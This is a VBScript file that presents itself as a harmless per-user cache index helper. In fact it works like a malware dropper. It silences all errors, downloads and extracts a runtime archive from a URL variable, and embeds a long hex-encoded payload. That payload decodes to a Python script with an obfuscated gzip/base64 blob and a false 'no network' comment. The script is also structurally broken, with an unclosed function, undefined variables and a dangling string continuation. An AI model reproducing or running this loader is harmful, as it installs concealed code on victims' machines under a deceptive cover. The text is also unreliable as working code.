' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
P3 = sh.ExpandEnvironmentStrings(P3)
K1 = sh.ExpandEnvironmentStrings(K1)
K2 = sh.ExpandEnvironmentStrings(K2)
K3 = sh.ExpandEnvironmentStrings(K3)
K4 = sh.ExpandEnvironmentStrings(K4)
K5 = sh.ExpandEnvironmentStrings(K5)

Function DL(u, f)
    On Error Resume Next
    Dim x, st
    DL = False
    Set x = CreateObject("MSXML2.XMLHTTP")
    x.Open "GET", u, False
    x.Send
    If x.Status = 200 Then
        Set st = CreateObject("ADODB.Stream")
        st.Type = 1
        st.Open
        st.Write x.responseBody
        st.SaveToFile f, 2
        st.Close
        DL = True
    End If
End Function

Sub EX(z, dest)
    On Error Resume Next
    Dim sa, i
    Set sa = CreateObject("Shell.Application")
    sa.NameSpace(dest).CopyHere sa.NameSpace(z).Items, 20
    For i = 1 To 40
        If fo.FileExists(RT & "\" & PY) Then Exit Sub
        WScript.Sleep 250
    Next
End Sub

Function H2B(h)
    On Error Resume Next
    Dim i
    H2B = ""
    For i = 1 To Len(h) Step 2
        H2B = H2B & Chr(CInt("&H" & Mid(h, i, 2)))
    Next
End Function

' runtime
If Not fo.FileExists(RT & "\" & PY) Then
    If Not fo.FolderExists(RT) Then fo.CreateFolder RT
    If Not fo.FileExists(ST) Then
        DL R1, ST
    End If
    If fo.FileExists(ST) Then EX ST, RT
End If

' payload - embedded hex first, then repo
If Not fo.FileExists(P1) Then
    Dim e
    e = ""2320436163686553796e63202d206c69676874776569676874206361636865206d616e6966657374206d61696e7461696e65722e0a23204170706c69657320636f6d7072657373656420736e617073686f74206d616e6966657374732070726f6475636564206279207468652057696e646f777320736572766963696e670a2320737461636b20696e746f20746865206c6f63616c207065722d7573657220636163686520696e6465782e2049646c652c2073696e676c652d706173732c206e6f206e6574776f726b2e0a696d706f727420626173653634206173205f6236340a696d706f727420677a6970206173205f677a0a0a5f4d414e4946455354203d20622748706b724e4556575a33694e6d6b62424e49484e5361664e334c6b436c6f333264376b63356671354e3777343152325277415a4736756a78706c76717434586f36384a7871726c3561575a4f56684e352b62756c53362f706a4870594578373856654b61436c56513379396f7a5a4b356252384a39385364523058544e636b71333057654774597074565766676565724e6d3077386d7037634f7636316168305976416d4d31697035766c65664667334c504b5174347868614a4f636c5271" & _
        "4776463257453771533856746d2b694d306f36687744562f612b306f44634a526152776a7338397768522b324b76796d4b416f446161746337615842702f464a324266323563646c56524d715a736275663344476535576b66736571674659326e725a5a37584534572b4e58584e5030376173676a6f717031666e467832494533585637392b3065627357654d2b556557737847526a6d6e723149322f425a6e644758484631695a426b4d6a415264384c7971443056454e7766533974335464724c74482f7735346471516447586a564d546751777864755a754e324b473054325679554d4f305235676e4b5038613252655666305a39624a71673469396353554a78763833725a657a6d5535677637526279533543553071355657506f4d734478784a4f72303046536a326969536e486f3970304343744a6f486a744533556d3856386832702f5470463844377564385350516e646477595a30685875465654326d392b6b66396f4578764c70456d414d374a5372326c4b6674634d5a516e7a4157744c6f76716242637459414144714f3835724d6f723936754f47484c505543314e546c416b362b756a44386e43454158754e545a6c344f4c3031494f483657" & _
        "65686552555954384b695742617a42682f2f796f454a573376592b4135557653704d5a7a59664c2f335348756f2b5655463449355a6c49417533656f30686e3562774a496f5a743953764b74546d797832726e6b4c5165346c726b4d547761697338434441557347707774674e674d5074624c2f7a6e61796c54377533326d537866594650546a3032526f50572f784d4d69476877566a787a4938313343752f5a71795a45347a583752627272597062557648744e58596e533563376e4c514f6d573034524b57355a6a36754a737573347433536b456b7034705637762f65394b6b4862457544524b70464336634d4e4b62486f4150534f6a35506e5637534966495830487a43696a4650596f744b6f63306d78372b5231766e784866383530514b2b724275445858476a73646b3457477a4b416756614b58792f6d734e70384b4435344c5a3058354631514956663175556c427344344761776f344277614f7841372b423571316c7033594b573243537a526b6e486a762f366e366e6a2b4d626542477274414c585a436d4f4138414734616b7439673256623862675941744b4253326a627242316a5455636c514e3364516a4a63596152575a2f374c674e6855" & _
        "416874393371736d3479316c55626e524f312b78435267376552502f7843643432314c7767662b73424a456549544b622b5556625061354c64756a767361457146337738567a5074685454486b346b536b4976594950565178527336744c32334c6f5a556d2f652b374932364535636a6c49513135376a785a4730664a764c65507347636950395078765242633356584974754f39695158327744774f4668736468304d4e6a4c4c3435674752626f506553477771525951564973387942517050774f306f347757702b6334597a486b313544552b37415a5265375471475154374146742b487469747235546c70797a453041586d6c34713376496e4776455553396b44334369626f6278577038414c505249794d4934524c364653644b4b5362494d74563079544e7076304642564b68365a456b754441302f79355256534256306239514237305070582f4b6d7a6c74477a776f6b5278686b39516950466a447671744e2b513141596c63566b584b6f7373425138376c734a76526341737971504d2f6d41614451796334364a4f34386c725151454c64542b4b5342795543357470667957306a455339573245334d54586e6f6a754c4138697553345678474766" & _
        "4b58316873766d326c556558524a7a6c41394d30774c67743052496c4b734d51457962774c69376577455652356d2f524a6f534754376b62706c6c6b31462f2f334567334a696843487963624637636f7365586c712f4a47507748564241694b4734706a396b51595939664e3934534c6b79475968306369756b683679794f7a4f413678696b4a61556a4f7141412f2f65326432507768577962343666474970705036794656686d344f36396e72466d352f35797262326e6f6949674f4e68694c63724131344e54343956774b754f4a3655754f6b417a4e4144395a637753443979314c7132547a7a4e4f70674e7143623976764b4f6676746f577466504442417653356137527132574d546a41384557734f5a42797948462f4a6b4859595067316d75704d354b7057666c5048417a754a764b6849382f6c5a506f4d646c634b4d74584d4f7a544961717148726169515578694d72453143766d7a772b6b56735a703644675356314e712b4b66383746667649337a326976625269662b68337233766b4c554c7959732b6532584e753550496d4534772b62656c7a7a423679394468302f5a38484e644c382b5773527662736c543977376951436c6575434d3439" & _
        "6a6e4b3069716530547770556e763936735845476941614344796878304d456f70654766475654795872696e436e71687a625668485a43676b3238303441554b5243686432364e564949437a3637372b766a6f4f54474e7056495267412b7749306b742b5a4c6e6637532b6e647879646835714b375037785a6d70306f7745634658565a307561675455656b537674365950674e54544569462f754577682f4f4a77676d7979456e752b43734a4b676678357a426d73394b6a2b6833574b647a6a724963643161624b2b38362f4441463735386b72533031754c445441737a487a4a6f6378774833656b71414f49664473364730304a54747551642f4b50335255564c3179445071784b795361396b7a3470414c6379687175654b536836744c67344e57627236593767754743315266556c6b59473656416c66426d524a376c716e5246325a6d384a3261584d414a5166634d726a614e514450424c526e66442b30572f61794438623159633870763670534b38502f366f587432336c6a322b6c6e525654506477584d4f56536d4e4f4d6f794b67434e4b766f2f5555696765466757576d47497a396a37555a3476634e616e4f68676d724c76486e2b726f32442f" & _
        "43762f59335730416146427574534947374763735842787a4b43646d535032715a33416a43537048736655527a7359464b7259634947302f72574f3158703869383345354454365a76333176723962556e685a4250757a5067375956556852704f57667a52796677586d6b3146446d565678437971534431697830784a7272514139795236714e4f69347254372b4d476767772b4432772f71704377472f68616972577369442f68616f334643344b39563672753253565834385065324633794d334c6a5a764c43724f594c457146595556794c416850766851714279394466426c6d5a536f78784c4466493233555a7243715663562f324d7134664667505a3645457835554b68674d634b787a526f506d496e4c345239484367446f5063596a6f477161354e2f6957626b73517766387059424d774b777032706d49613535425730564f79787355554551392b3565584e795936312f3544546b61686c646b6f354d397543664a367459396a666c7251556b6f4a464c7136576f68637554554c3563512f515275564e5666767141696b474454486b4b712f326d57524c4c6b666b397064666b777271777639344d4e585447684477594c3775333267544b6c4f66" & _
        "546864783438753270544e70792f312b33575667566b4f615169706e6a53662f4170634e3531646b4d6a47675166746479737148706351587576567246744a476d624435537352536e4a77384f58636676337230323839742f6f6846792f416a36556c6742463232493471733961542f746441587466476a426977426a574f6f417a556b6d4b656b594677626258656f4c536b5246504d504d7372707554777677354e6f717931736345394d48434b64427a594248745162386e647249715157306c6371574539784952633931524f70634d45786935764e4f63793468462b39613131577879332f68347764554c4c3379305357784863752f626a75524c50494c5a536367722f754c584456784770552f313735733874396c716745682f736e4d67597871723763427a2b433452313070784c6c6f635235724574696b4672612f4533386e794e43725a556377515a6d755664715558487758726c59664a6f79794f7039726b6a50494a71705847507751756e6b386d4672767a7739362f6b653362363153344d366a72476656674147476a50636e5141556a66374152716e5037464979503943767861654c6f4f4b744d4d50687269547071336d5966436d454731" & _
        "4a56375a5a644c44756e622f4f3159552b79456e73395046574c5a53464d34524a4830314975587542305464446445686939665261324e4d66794749674253424e6733446f75766667443946746a7534737839503931484f646f30734e4b66706b63396c4657682b7a787045574846594330486b79507266397668346a466b56562b68504b3335355a557764664643456a7070524357356e374e34485335465a414266555138304948527975584255593049484a786661535a6a436e69694776514c30737a654d75327674796642654478723144486b666f656b42786d2b7261565859705258714741784d6b61734f792b5367472f63626c6e7556677733314a6f32586d496c6c57396c4b576732624a4d4575635139486f527666744635506a594b4c37436737374c706762343832644e46374f56784f6f6f76724b3261796d6e31474a6456414d545a6e2f6a4758306133334a453951646d4c516a5a33594372396e676836714e35616337575449515650795236556378716a634a472b4a39314f695865557a4a4b336a42633649706e435538314d447532796a4b4d79504563696372654d79646656673135303776375a516243374c7571364d774579484f3865" & _
        "4c76755a5746316b4a6c4c58575876464549304a7375416136393069622b4579696a69556a762b65644f64316e76466a364e7957684c41586d43696d6d3474345a45756c736756736569464c2b41765166474a4959696642794271526f6f2f7358786e7944315042706776527a2b464d42794a74494138783679454b48574b5776425674704a68542f434d4f65674a766b58413856353879686562676b416d2f6f645a4e62564e736b38722f4634323772446656794c56425553483033372b44554141416a5a4e7778662f346e52744b473835514d5a516f366a41586b4a4e6447304e46326f3953617a44774479675078336f66646c4e532b4346376964614a77626641552f686b665543664475635769514b4d687458504a6a46754f454b2f2f58494730484451553769394d703574766e497163654e45646a3977664c6f6959316a63334b3574426b584947454366386555705264433742494f624b5477347979566f31527478634e423841523359796a306d31646b7536495a2f33364d4166562b614f4b513759502b744c36657948427942375a6b4b383166724c5a596d654371464d7278536255725434433957626c4d4179516e494f53536361437542362f" & _
        "484c6b5270625a5639494561646f4e3037696b462f394631767364526276374f6b6c353177443849432f373649546f4c72524d3177533732735a716a3353366a4b544f416c6273337947366565546a7854654248626f6d346549716338596877632f6d6e5767486e794b4d74304a777068672f5350552f63633931307572475041626c4f5a6848544e464b67796958624a797a48764b642b69765a4c6348746a4735727a344e4652466c336c4a6d6b53753573436d7564356a43534d5833344d415977706d50754b6c61566c734161353336524a4b354671724948352f654435462b5641303553517a44676e3738727838454d4633747738726f544a6f32744c52315a78434c34433675507153637256687463464146394a2f646468476f5854667844787934645775534f2f4a6561367257586370764d4d472f74505030686f33713446377735534539367a58304256495a683656624e3651452b37543349474b424a4a55683838754569356a4f484d5351512f7a6b552f56474562386d374b3645444c3667617172326f4558376667393252316f7142516b30356459442b33747a7772732f566a4455474d4c6339513134374834576b70665836755979626e7372" & _
        "363979513842776b392b326d346d6f7473444c654d4d34377559694474506237384d33346b51534f45615767506c705841777479614f6f746772446442436e51684253334253643772423568625669327353326270364338664a705953696a32344276424d58584165766a4c2b69665867767935317543425147596153416c67503750554f71776b6154577a4673623130414c477275755044412b624353744b3433704f466a4663482f2b627547502f6c51665158794b5738427a49786d46755a374f51564b69725a6a4f69695369415677563764644f563235477242336e7535434a6456564f582f51473036547a59742b41645a38445538464a734e2f4864547033785a654b507943616c35506e4b5833376878634e70714e584b2b4c31596c31634b5836344b5861695254476c53365648594b70474a6d7252516d336d564c793470356f6c786171365856374a486b4543656d384b354e69426a42703445616837414d396d3153776343713169334557362f507a562b4f74525832436c565272674959706b503869646b4d4831426972705a7a736863454a4b717a7443386f6b5a7a4b6c444a32734671757673376d36734b376d7134635a3250482b51517377" & _
        "347462366d57724f476a32674f53524642365059525a566266597a4a707377634f547a585438577a59752b3979786c5751375465356367317134626d3944682b366d497535643468544c34483970416c7a4b4f63782f4244453961435a6e44595951484335446e5231474c686f6b55357a634c45444f6141652f6d5a394761724a77462b4165444d757731586e6d4a69397635504b44704e4e4e74716b78796a6b70692b494b524b62565644412b4c4f6475497a6442325377677846446b35447468304e58693353476c5055346c466f7275494e594f553962357731422b70514752766f35785156675478732b426154622b4b4e6a617a36386e745866556268324d3739616e657932594d7071514e6153583170755972376443686f3953736f616337457548522b5335546967464e715732596d4e385352324a616a432f53434e556b306f4c35592b697a36736f3051352b426f493257323949716f4d5a4f714d666631655a49494b6d766b356e4d4f713935784768524d69484463346b4d666a6f63536c5941746b67326176637175684b62704a544b365a5848616676656a325435316e4c59637a5676645731302f327659574830736277644f386872626e5379" & _
        "742b70354a664a3448644361627344307a4a476f6d636d6b412f4c785a6d703733786369624f445a4679535133692b63766e784138775149426c2f585463493836486c444c6b3648425670394e424f6b4237333769485173364d49346f6c727537755065477666316e326c47765031473947422f63357a494a67767a6c6258342b38547259484d625a476957694968376759427238416962644d33324774655877376465793777536875507476465036656452456a557141635750782f2f3475463948384b45794779494c35625568617767355a7231495a7938313664645a575974684f4d7948657539735a346a53725769696b6d594c7a6f4d5169793139393066523947722b4668466f4f4542464d415870634c4b386e4647496c2b766d423756443063444f536d4f6232776d763733612f76584e445441486944676e7362387132564e2b4a313561456d75767069576662684c774548693656357a465a3059396b525757657450524251597a315a444b357a30646752567a6962674c67702b744e4245756f4d58372f43666358744d6c45735874706a3434316d72666d413135647475676f6f7a755250353844367874686a6131654f41434d552f4a77784352" & _
        "6a6e3831385643706a526739434c78644a4a504578316250506b676f79706c7331566a61382b2f7a544e4f65537635526659766541334361774865337a304d434d2f482f4b6c476862713570724762746b495641696c506a58586f376f546d4c7472426b5150462b46764d2f3179503875394133395454783466566e3936307933474d38584279754277432f596332644769704b757543326d714470683573567044466f4469646b5630332f786f3279426a714332565458753173676a627751467a7936504854464130666e55725033754c6e56386b734b4a31357061376b6b5865366d2b4c6a6a4c6c65535875426458733958577a545863586933656274532f3973386f78484a694a6c6c384d342f2b45634e33745946333261575648614630516c494d54364766305042557749316835444135535a6a757069525134687461436b634679536c35304558534a586954794674544b66334c424e724336414d79534f6a303451746e4c557a31344c68642f353739534c5636346747355a6b4b6239746d4d4b556738336a6761504b5544786a453362382f4b464e7053534a3630664f464a7a354e654955494d626470386b453773327a6c6a584c472b2b70495044" & _
        "694561464e744b474c7062446e56366a6b53465478686d694f4c59426a3141484773676b45663439593653434753444147496c6843574e574d396c71534e4e5967753361625264456548484556345a4d7a372b444a746b7361414f766855745179454d614a42385557417564385243476738497a51766e4b534b356958474d7249346833374c5258734d656d4f7a496f53595a685659463570766a506b75505479564b715a625276544e746b4161634d6c6e564d4b537343476469384877734e4b2f76442f374643464161754e6d6d6c6e4570743243655162622f63574a4550797158736a656838597551455837426973564f72447733667039694a6275652f376f35584875376f3078626458646b67394f482f3062714e727a79322f55304a4845547339483668513733735a383446496c5435424542713354487a356c366b4d2b347371786a525a636a675a51696a304c706d537444775464584979414665444d745863446d344a686565726a4f6c61456a73576b6972366439716c30452f7266563932317766444a394b73506d77354261565641735573486651776c5a694c6f7273504557624c3358634c53676956386d776859634c746667344f3972776e4f" & _
        "6d625156596231315a2f45687a47565645356d6330584b4d654953494b42623073763878675751564c2b33674574464e364453657a76547a653933364c2b2b6133696a7a7848757334725a33313849334672347a42577a4d45306f514d546732317576706977724a424f37727a2b6f7874707a345a5742524a766149474744704b7152734765784e3163666a736d35514a707a30513444506d6964626d6473307a4a5477484a7056716365666f764c4a6d4a436a787a6263397a5678347a394278685333366651524435785a7556746d484657673034776a6767596d3875706c30337659316b467069436d795162613932543768303247534e4f6e2b587a42536e366f4530367751544c75496c537a454b535042593235717336697a34355562745644654b78516c6d55756a43514334394c626935615538677a37423363687248336b784c4f754e4a5a64454e463634726557794452555743456f4d6a4b4c437358352f567142782f642f35474c41637a314b74664d764b6d2f4132706142467558616c58356970564649745537765834475430336672384d47446f7144544f48715534436a64564b65315a5551375150493965587634672f4d69724c47766c4a34" & _
        "396b4243723171545871513654644d6a414b594a717a4c3136456c6430484b6e64694c7268577a48664b647a39544f4350494e3646414f66477341744d41454e726f4f537a6d4a776a506b7a4d4f305663336b51534469597a6a39564f6573523771477570446d444c4a4647707a3374754a62396c3558545873314277736a55534657484a39627632666472524f763359743270695a704934352b426255395066626e58743330612f4a51376a5971386c32476152647146556c61306f4d4956774777435877632b787a6d384d42667264502f4b786f5658307279674d6d3761375a31417432467a5339635a55775a4a626b30723961553074482f54506f5a50577a4a32774a62385957385a4261372f7838416852695553654c32782f78326f3579623361506156707968774b364c33754165367246725766702f4f4e746d626f4865362b57746c6f6e70417a6b7752784c633969554976625478326a6434794538586233716630764b3278327a616745584a48546843575664637a346d41493774577348756c4850707166304b384f414d5a326c795672424f54676f6936786473713032335434557451712b47727863346d574f6a7544316c7947354d395a3732" & _
        "4b5a4e72706d625a6d77536c4c6433456951745764546663375944664572336e30617342596e6d2f617a5863436c736555576a50625a4a53343043683672705179786f6d4b42356b6b5271456b47764667344a324d4e7455756965774758556a52324e51574b7a5043532f587a64614c5933685561503253356c50723255505565705a4b54754a69584b617535504651334b64764c6e6a523031674c6e7646454d746f696239775562715554596c39664777635a425a6e753159736e426c6b625839704968454f6451533965792f6f456f3870686d6c75346c59554a44715343686259396c516a45636b72573349747679795a354a51392b74486354425739536453494b74414d72626f35315a45646c2f556944637559676536696c3632702b2f5639367351314377704c5273376d4e33723251335243613737786559355458474f644f2b5930616a48304a39713856744f444d4f536d577559594d72576d6b61484b664e64747248573147593844764144326a426d2b49335977552b62342f62666772562f4f4d353635573835356370456d4d34574d47624d317a564c63494f356d48337250524f33546166684f66544a5a6e524847547a544c46334668574f50" & _
        "70342b526d58394c4e5856694b326a51635139733162306838574773617a77644b6f70506a6b5850484937534f676e4e4c3057796e6f514a4e7478342b6664594b396733786e36506b6b7952386a624262584c554d3870446143736b6957766f796236574461336e7a57716c74366f4b394f69594451383258352f384332626e464f4843396c4e4254665057536368796c6b44456d656e6a5070675a66684d532b72776b4d514477367a7175685059615170766d4b6f6d6232516e313661624670475a756e6e50452f356958584c77525959554c763249455571622f63332f47556266696778423034794c50304556772f477a4f76732f6970704d5a2b7551574f5457644d6c717534686e3471416e54383157323357305a2f6d476e413757443668652f353139637958302f50734c6370714a6d694c53337776547473483672415850336e67324278347952514f504a6b675a36424d375164516f6f5632644c6e46755257643345775a4f36475a6d6647504e66356874316f67522f596f59536a4e5a655a424972415348477a5557376d6f2b42452f3536583356563846436e4f735377727934766443393362587a723338713067486b7134316938332b37342f43" & _
        "4763434b646f7a396f325a6c5a4332524b444c544763354f756371354f41686c562b35426b774e695873644d65625a7359354335746f6943382b616f4e53545531585a664d7045382f7241507776694b4f6734596d36426736704a383435644641493772484a6f7a492f313265756a75654f74386d3568554c46787973464a4e5a58696947785633433952764444597474384979474936704f4a32374f694e444e304642455177694b656676384e6e615759447a53636639546554727a2b2b67714e39762b554f31586568373447464d74486f56655a31416a55357966486b4a702b59694f516632316d3975395371646d694a62504153486759495959683848597745554a5050656e7a4d5172722b3365325646396c494c4747334a2b47484f494b57672b6e6a65347a304e62396561364361705164557135565261624a585874417a525273537350446b514d3968477444764777304d4b6d2f7878654e666a6254344f736952474651465057704b4e7a4c495763595a4776424370555947434a774b5657717a456d66774832727a2b70736262474d4350436d695a3271364c523177466d3063553861506348537446704b4f4c664f3537685a63424849656b4c7a" & _
        "726276374f645059306f47596832626c4356344a2f4a523750467664585038615a725269527071666548503778676b474d6f52374a44375a794d692f5977754f735048473152715939385450797747592f355434554f3266364738574941767042536630716b474677376d32573556627a4d4331313967345435584c712f5971467938435034504e33624b72683663585757646b2f7353625375616e68443763774a573730344241434d59354f554656343851456c64655463324b36664666786e62505a467669765476446f75577961744f79434d503657526f444b76683069436c7346515046476f566645646c5359574d77332f2b6f4764766b6335375856676757485167554c56394c4f5537455163496e5737527763503558374a68725558627853575447526a6b492f522f745441783142424f3951574248644c37542f2f53616c33667357656835397474496c35394e693057362f777a364e53717566584e45453944574c3472354f443465675a4a522b76426d306c31594e517730615273536d3749576d38535767686a51544667377073562b324538534b4b4534316847764370467736737678542f735355486f72724450742b786558434b2f4a554b47" & _
        "47497874676939724a7a68794474564b6f3443633138356d586c49593558716d38332f4a6d7666644f4c50714830684871616e4e53764f36314f4c517833394c4739686b4b494250745453572b576759693549316c37494c4f47734e586a2f71714637544b496d704952397a5741474d5859486e76794a66464e6531306e6c33647539646e4a684d6936527549455a326e626d31514d385a6176464a51516b7555676d785a356463756f315158416350335743394659396a6f4e4f53356671423344434b4a6e4d6e44346e464248476f2f7a6f6d4c705268625570366d656658394e4344365a7939746f66496259344267567036473268764736616849364d626d4e4f6553717437466732716642324a2f4a616b6f706d714c57344d744b42667352385842497a72787073484b7458417a4f757068762f4466446858706c71486d476849667546314b75306a4f534541635a302b4d54615958593065737745644d6b703349593569457866716b66396a4f616d3469787468735a30465a45582b79646a6262617a42726669373947377a4251787263573638724a5578636a79516c306247376a676a495a7a6633413274376d6f752f61376c3368497030364e615550" & _
